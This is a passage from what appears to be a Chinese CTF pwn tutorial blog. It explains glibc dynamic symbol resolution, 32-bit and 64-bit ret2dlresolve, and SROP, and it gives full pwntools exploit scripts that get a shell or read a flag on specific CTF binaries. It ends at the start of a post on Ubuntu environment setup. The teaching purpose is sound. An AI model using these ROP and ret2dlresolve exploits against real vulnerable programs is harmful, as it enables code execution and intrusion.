，其中有 libc 的基地址。</span></span><br><span class="line">        <span class="comment">// sym 指针指向 libc 中目标函数对应的符号表，其中有目标函数在 libc 中的偏移。</span></span><br><span class="line">        result = _dl_lookup_symbol_x(strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment">       of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment">       offset.  */</span></span><br><span class="line">        <span class="comment">// 基址 + 偏移算出目标函数地址 value</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS(result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment">       address) is also known.  */</span></span><br><span class="line">        <span class="comment">// 这里认为 link_map 和 sym 中已经是目标函数的信息了，因此直接计算目标函数地址。</span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">        result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">    value = elf_machine_plt_value(l, reloc, value);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">        &amp;&amp; __builtin_expect(ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">        value = elf_ifunc_invoke(DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    <span class="comment">// 更新 got 表</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt(l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>需要注意的是 <code>_dl_fixup</code> 中会有如下判断，根据这个判断决定了重定位的策略。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect(ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br></pre></td></tr></table></figure></div>

<p><code>_dl_fixup</code> 函数在计算出目标函数地址并更新 got 表之后会回到 <code>_dl_runtime_resolve</code> 函数，之后 <code>_dl_runtime_resolve</code> 函数会<strong>调用目标函数</strong>。</p>
<h2 id="32-位-ret2dlresolve"><a href="#32-位-ret2dlresolve" class="headerlink" title="32 位 ret2dlresolve"></a>32 位 ret2dlresolve</h2><p>在 32 位下我们可以利用 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时的执行流程进行控制流劫持，因为这个执行流程会自动计算目标函数的地址，<strong>不需要知道 libc 具体版本</strong>，适用性更强。</p>
<p>其中 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 为 0 时 <code>_dl_runtime_resolve</code> 函数的具体执行流程为：<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/52d2f9340bd5f998d2887f40be788f3e.png" >https://i-blog.csdnimg.cn/blog_migrate/52d2f9340bd5f998d2887f40be788f3e.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;70%x)</p>
<ul>
<li>用 <code>link_map</code> 访问 <code>.dynamic</code> ，取出 <code>.dynstr</code> ， <code>.dynsym</code> ， <code>.rel.plt</code> 的指针。</li>
<li><code>.rel.plt + 第二个参数</code> 求出当前函数的重定位表项 <code>Elf32_Rel</code> 的指针，记作 <code>rel</code> 。</li>
<li><code>rel-&gt;r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code> 的下标，求出当前函数的符号表项 <code>Elf32_Sym</code> 的指针，记作 <code>sym</code> 。</li>
<li><code>.dynstr + sym-&gt;st_name</code> 得出符号名字符串指针。</li>
<li>在动态链接库查找这个函数的地址，并且把地址赋值给 <code>*rel-&gt;r_offset</code> ，即 GOT 表。</li>
<li>调用这个函数。</li>
</ul>
<h3 id="改写-dynamic-的-DT-STRTAB"><a href="#改写-dynamic-的-DT-STRTAB" class="headerlink" title="改写 .dynamic 的 DT_STRTAB"></a>改写 .dynamic 的 DT_STRTAB</h3><p>这个只有在 checksec 时 <code>NO RELRO</code> 可行，即 <code>.dynamic</code> 可写。因为 <code>ret2dl-resolve</code> 会从 <code>.dynamic</code> 里面拿 <code>.dynstr</code> 字符串表的指针，然后加上 offset 取得函数名并且在动态链接库中搜索这个函数名，然后调用。而假如说我们能够改写这个指针到一块我们能够操纵的内存空间，当 resolve 的时候，就能 resolve 成我们所指定的任意库函数。</p>
<h3 id="操纵第二个参数，使其指向我们所构造的-Elf32-Rel"><a href="#操纵第二个参数，使其指向我们所构造的-Elf32-Rel" class="headerlink" title="操纵第二个参数，使其指向我们所构造的 Elf32_Rel"></a>操纵第二个参数，使其指向我们所构造的 Elf32_Rel</h3><p>由于 <code>_dl_runtime_resolve</code> 函数各种按下标取值的操作都没有进行越界检查，因此如果 <code>.dynamic</code> 不可写就操纵 <code>_dl_runtime_resolve</code> 函数的第二个参数，使其访问到可控的内存，然后在该内存中伪造 <code>.rel.plt</code> ，进一步可以伪造 <code>.dynsym</code> 和 <code>.dynstr</code> ，最终调用目标函数。</p>
<p>这里以 MidnightSunCTF2022 的 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2022MidnightSunCTF_speed5" >speed5 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 为例讲解具体利用过程：</p>
<p>可以看出，程序主体部分是一个非常简单的栈溢出。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">go</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">48u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>由于溢出长度有限，因此首先需要栈迁移到其他地址处。<br>![在这里插入图片描述](<a class="link"   href="https://i-blog.csdnimg.cn/blog_migrate/d9b4d1426691a6b5f2d36eab1f459760.png" >https://i-blog.csdnimg.cn/blog_migrate/d9b4d1426691a6b5f2d36eab1f459760.png <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> &#x3D;60%x)</p>
<p>为了调用 <code>_dl_runtime_resolve</code> 函数，可以把接下来 rop 中的返回地址设为该函数的 plt 表地址。该地址对应的汇编指令如下：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/e67b342e7833f0cba6904e7f65910901.png"
                      alt="在这里插入图片描述"
                ><br>可以看出 <code>_dl_runtime_resolve(link_map_obj, reloc_offset)</code> 的参数1 <code>link_map_obj</code> 被 push 到栈中，在此之前，栈顶一定是参数2 <code>reloc_arg</code> 。因此构造的 rop 中接下来的值是伪造的参数2。接下来rop链的内容是目标函数的返回地址和参数（具体rop链为什么这么构造可以看前面 ret2libc 中 linux 延迟绑定机制的原理介绍图）。</p>
<p>之后就是伪造那 3 个结构，具体见下图。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/6dafe13803caaf398e55613189c6bda3.png"
                      alt="在这里插入图片描述"
                ><br><strong>注意：如果 patchelf 修改了 ELF 文件，那么这些表的偏移会发生改变。</strong></p>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./speed5&quot;</span>)</span><br><span class="line">context(arch=elf.arch, os=elf.os)</span><br><span class="line">p = process([elf.path])</span><br><span class="line"></span><br><span class="line">rop_addr = elf.bss() + <span class="number">0x700</span>  <span class="comment"># adjust according the stack when call the _dl_runtime_resolve</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dlresolve</span>():</span><br><span class="line">    func_name = <span class="string">&quot;system&quot;</span></span><br><span class="line">    func_args = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">    resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header[<span class="string">&#x27;sh_addr&#x27;</span>]</span><br><span class="line">    JMPREL = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_JMPREL&#x27;</span>)</span><br><span class="line">    SYMTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_SYMTAB&#x27;</span>)</span><br><span class="line">    STRTAB = elf.dynamic_value_by_tag(<span class="string">&#x27;DT_STRTAB&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_rel_addr = rop_addr + <span class="number">5</span> * <span class="number">4</span></span><br><span class="line">    reloc_offset = fake_rel_addr - JMPREL</span><br><span class="line">    fake_sym_addr = rop_addr + <span class="number">7</span> * <span class="number">4</span></span><br><span class="line">    align = (<span class="number">0x10</span> - ((fake_sym_addr - SYMTAB) &amp; <span class="number">0xF</span>)) &amp; <span class="number">0xF</span></span><br><span class="line">    fake_sym_addr += align</span><br><span class="line">    r_info = ((fake_sym_addr - SYMTAB) / <span class="number">0x10</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span>  <span class="comment"># 0x7 means that Assertion `ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT&#x27;</span></span><br><span class="line">    fake_rel = p32(elf.bss() + <span class="number">0x10</span>) + p32(r_info)</span><br><span class="line">    fake_name_addr = fake_sym_addr + <span class="number">4</span> * <span class="number">4</span></span><br><span class="line">    st_name = fake_name_addr - STRTAB</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) * <span class="number">2</span> + p8(<span class="number">0x12</span>) + p8(<span class="number">0</span>) + p16(<span class="number">0</span>)</span><br><span class="line">    bin_sh_offset = (fake_sym_addr + <span class="number">0x10</span> - rop_addr + <span class="built_in">len</span>(func_name) + <span class="number">3</span>) &amp; ~<span class="number">3</span></span><br><span class="line">    bin_sh_addr = rop_addr + bin_sh_offset</span><br><span class="line"></span><br><span class="line">    payload = p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(resolve_plt)</span><br><span class="line">    payload += p32(reloc_offset)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(bin_sh_addr)</span><br><span class="line">    payload += fake_rel</span><br><span class="line">    payload += <span class="string">&#x27;\x00&#x27;</span> * align</span><br><span class="line">    payload += fake_sym</span><br><span class="line">    payload += func_name</span><br><span class="line">    payload = payload.ljust(bin_sh_offset, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    payload += func_args + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">24</span></span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    payload += p32(elf.search(asm(<span class="string">&#x27;leave;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload += p32(rop_addr)</span><br><span class="line">    payload += p32(<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    pause()</span><br><span class="line">    p.send(ret2dlresolve())</span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>
<h2 id="64-位-ret2dlresolve"><a href="#64-位-ret2dlresolve" class="headerlink" title="64 位 ret2dlresolve"></a>64 位 ret2dlresolve</h2><p>64 位下伪造时（<code>.bss</code> 段离 <code>.dynsym</code> 太远） <code>reloc-&gt;r_info</code> 也很大，最后使得访问 <code>ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;</code> 时程序访存出错，导致程序崩溃。因此我们退而求其次选择 <code>ELFW(ST_VISIBILITY) (sym-&gt;st_other)</code> 不为 0 时时的程序执行流程，此时计算的目标函数地址为 <code>l-&gt;l_addr + sym-&gt;st_value</code> 。</p>
<p>虽然这种方法无法在不知道 libc 版本的情况下完成利用，但是可以在不泄露 libc 基址的情况下完成利用。</p>
<p>为了实现 64 位的 ret2dlresolve ，我们需要作如下构造：</p>
<ul>
<li><code>resolve</code> 函数传入的第二个参数为 0 ，从而从 <code>Elf64_Rel</code> 数组中找到第一个 <code>Elf64_Rel</code> 。</li>
<li>为了避免更新 got 表时内存访问错误，<code>Elf64_Rel</code> 的 <code>r_offset</code> 加上 <code>link_map-&gt;l_addr</code> 需要指向可读写内存。</li>
<li><code>Elf64_Rel</code> 的 <code>r_info</code> 的低 32 比特设置为 <code>ELF_MACHINE_JMP_SLOT</code> 即 7 。</li>
<li>为了避免下面这行代码访存错误，需要让 <code>l_info[5]</code> 指向可读写内存。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br></pre></td></tr></table></figure></div></li>
<li><code>Elf64_Rel</code> 的 <code>r_info</code> 的高 32 比特设置为 0 这样找的就是 <code>Elf64_Sym</code> 数组中的第一个 <code>Elf64_Sym</code> 。</li>
<li><code>link_map-&gt;l_info[6]-&gt;d_un.dptr</code> 指向 <code>puts@got - 8</code> 这样就伪造出 <code>Elf64_Sym</code> 的 <code>st_value</code> 为 <code>puts</code> 函数地址，同时 <code>st_order</code> 也大概率为非 0 。</li>
<li><code>link_map</code> 的 <code>l_addr</code> 设置为 <code>&amp;system - &amp;puts</code> ，这样 <code>l-&gt;l_addr + sym-&gt;st_value</code> 结果就是 <code>system</code> 函数地址。</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/9d2f83c616a5538a3a4ea6975318bc19.png"
                      alt="在这里插入图片描述"
                ><br>例如 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/2021hgameweek3_without_leak/without_leak_b7bd5f2d0faebbc6ba6964bca265a506" >2021hgameweek3_without_leak <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 这道题目。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;input&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>栈溢出后面会关闭输出流，无法泄露 libc 地址，因此可以采用 ret2dlresolve 的方式实现任意命令执行。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process([<span class="string">&#x27;./without_leak&#x27;</span>])</span><br><span class="line"><span class="comment"># p = remote(&quot;127.0.0.1&quot;,1234)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./without_leak&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rw_mem = elf.bss() + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">n64 = <span class="keyword">lambda</span> x: (x + <span class="number">0x10000000000000000</span>) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_fake_link_map</span>(<span class="params">fake_linkmap_addr, func, base_func=<span class="string">&#x27;puts&#x27;</span></span>):</span><br><span class="line">    offset = n64(libc.sym[func] - libc.sym[base_func])</span><br><span class="line">    linkmap = p64(offset)  <span class="comment"># l_addr</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0x68</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(elf.bss())  <span class="comment"># l_info[5]</span></span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x100</span>)  <span class="comment"># l_info[6]</span></span><br><span class="line">    linkmap = linkmap.ljust(<span class="number">0xf8</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    linkmap += p64(fake_linkmap_addr + <span class="number">0x110</span>)  <span class="comment"># l_info[23]</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(elf.got[base_func] - <span class="number">8</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(<span class="number">0</span>) + p64(fake_linkmap_addr + <span class="number">0x120</span>)  <span class="comment"># Elf64_Dyn</span></span><br><span class="line">    linkmap += p64(n64(elf.bss() - offset)) + p32(<span class="number">7</span>) + p32(<span class="number">0</span>)  <span class="comment"># Elf64_Rel</span></span><br><span class="line">    <span class="keyword">return</span> linkmap</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *system\nb *0x40119A\ndir /glibc/2.35/source&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">fake_link_map_addr = elf.bss() + <span class="number">0x800</span></span><br><span class="line">fake_link_map = build_fake_link_map(fake_link_map_addr, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">sh_addr = fake_link_map_addr + <span class="built_in">len</span>(fake_link_map)</span><br><span class="line">resolve_plt = elf.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="number">0x28</span> * <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rsi; pop r15; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(fake_link_map_addr)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(elf.search(asm(<span class="string">&#x27;pop rdi; ret&#x27;</span>), executable=<span class="literal">True</span>).<span class="built_in">next</span>())</span><br><span class="line">payload += p64(sh_addr)</span><br><span class="line">payload += p64(resolve_plt + <span class="number">6</span>)</span><br><span class="line">payload += p64(fake_link_map_addr)  <span class="comment"># truct link_map *l</span></span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment"># ElfW(Word) reloc_arg</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x200</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; \n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = fake_link_map + <span class="string">&#x27;cat flag&gt;&amp;0\x00&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><p>简单的说就是如果系统调用 <code>rt_sigreturn</code> 时会根据当前栈顶的 <code>Signal Frame</code> 结构恢复各寄存器的值。通过伪造 <code>Signal Frame</code> 并通过构造 rop 使程序执行  <code>rt_sigreturn</code> 就可以执行想要执行的函数以及把栈迁移到任意地址。</p>
<p>以 64 位为例，其中一种构造方式如下：<br>其中 0xF 为  <code>rt_sigreturn</code> 的系统调用号。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/036ee63b7bb54a4fe5d98c064c787fec.png"
                      alt="在这里插入图片描述"
                ><br> <code>Signal Frame</code> 结构如下：<br> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/e3e1b6a53bd2c560f2b08fc27d87d60d.png"
                      alt="在这里插入图片描述"
                ><br>通过设置 <code>Signal Frame</code> 的 rsp 的值栈迁移，可以连读多次进行 SROP。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-stack-overflow/images/d69ea986473e28e4a4ac62a88a12edec.png"
                      alt="在这里插入图片描述"
                ><br>例题：rootersctf_2019_srop</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> __int64 <span class="title">sub_401000</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">sys_write</span>(<span class="number">1u</span>, ::buf, <span class="number">0x2AuLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sys_read</span>(<span class="number">0</span>, buf, <span class="number">0x400uLL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>存在栈溢出。</p>
<p>可供利用的 gadget ：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000401032                 pop     rax</span><br><span class="line">.text:0000000000401033                 syscall                 ; LINUX - sys_read</span><br><span class="line">.text:0000000000401035                 leave</span><br><span class="line">.text:0000000000401036                 retn</span><br></pre></td></tr></table></figure></div>
<p>可以完成改 rax 和 系统调用，不过 ret 前多了一个 leave ，因此连续 SROP 时不能像前面示意图那样直接改 rsp ，而是将 rbp 设为目标栈地址 + 8 ，利用栈迁移将栈顶迁移到目标地址。</p>
<p>第一次 SROP 可以调用 read 向 .data 段的 buf 写入第二段 rop 以及 <code>/bin/sh\x00</code> 字符串。<br>第二次 SROP 执行 execve 获取 shell 。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26384</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./rootersctf_2019_srop&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./rootersctf_2019_srop&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    buf_addr = <span class="number">0x402000</span></span><br><span class="line">    syscall_leave_ret = <span class="number">0x401033</span></span><br><span class="line">    pop_rax_syscall_leave_ret = <span class="number">0x401032</span></span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">0</span>  <span class="comment"># read</span></span><br><span class="line">    frame.rdi = <span class="number">0</span>  <span class="comment"># stdin</span></span><br><span class="line">    frame.rsi = buf_addr  <span class="comment"># buf</span></span><br><span class="line">    frame.rdx = <span class="number">0x400</span>  <span class="comment"># size</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line">    frame.rbp = buf_addr</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;a&#x27;</span> * <span class="number">0x88</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.sendafter(<span class="string">&#x27;Hey, can i get some feedback for the CTF?\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">    frame = SigreturnFrame()</span><br><span class="line">    frame.rax = <span class="number">59</span>  <span class="comment"># execve</span></span><br><span class="line">    frame.rdi = buf_addr  <span class="comment"># &quot;/bin/sh\x00&quot;</span></span><br><span class="line">    frame.rsi = <span class="number">0</span></span><br><span class="line">    frame.rdx = <span class="number">0</span></span><br><span class="line">    frame.rip = syscall_leave_ret</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload += p64(pop_rax_syscall_leave_ret)</span><br><span class="line">    payload += p64(<span class="number">0xF</span>)</span><br><span class="line">    payload += <span class="built_in">str</span>(frame)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure></div>]]></content>
  </entry>
  <entry>
    <title>linux user pwn 基础知识</title>
    <url>/2024/11/07/linux-user-pwn-basic-knowlege/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h2><ul>
<li><a class="link"   href="http://old-releases.ubuntu.com/releases/" >镜像下载网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li>为了避免环境问题建议 22.04 ，20.04，18.04，16.04 等常见版本 ubuntu 虚拟机环境各准备一份。注意定期更新快照以防意外。</li>
<li>虚拟机建议硬盘 256 G 以上，内存也尽量大一些。硬盘大小只是上界，256 G 不是真就占了 256 G，而后期如果硬盘空间不足会很麻烦。</li>
<li>更换 <a class="link"   href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" >ubuntu 镜像源 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> ，建议先在 <code>系统设置 → Software &amp; Updates → Download from → 选择国内服务器例如阿里云</code>（貌似不这样后续换源会出错），然后再 <code>sudo gedit /etc/apt/sources.list</code> 将镜像源中<strong>不高于</strong>当前系统版本的镜像复制进去（高于当前系统版本容易把 <code>apt</code> 搞坏）。</li>
<li>Ubuntu 换源 error：The following signatures couldn’t be verified because the public key is not available 解决方法：<code>sudo apt-key adv --keyserver keyserver.ubuntu.com --recv-keys 5523BAEEB01FA116</code> 其中的<code>5523BAEEB01FA116</code> 是根据错误提示写的。</li>
</ul>
<h2 id="基础工具"><a href="#基础工具" class="headerlink" title="基础工具"></a>基础工具</h2><h3 id="net-tools"><a href="#net-tools" class="headerlink" title="net-tools"></a>net-tools</h3><p><code>ifconfig</code> 查看网络配置需要安装 <code>net-tools</code> 。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install net-tools</span><br></pre></td></tr></table></figure></div>
<h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install vim</span><br></pre></td></tr></table></figure></div>
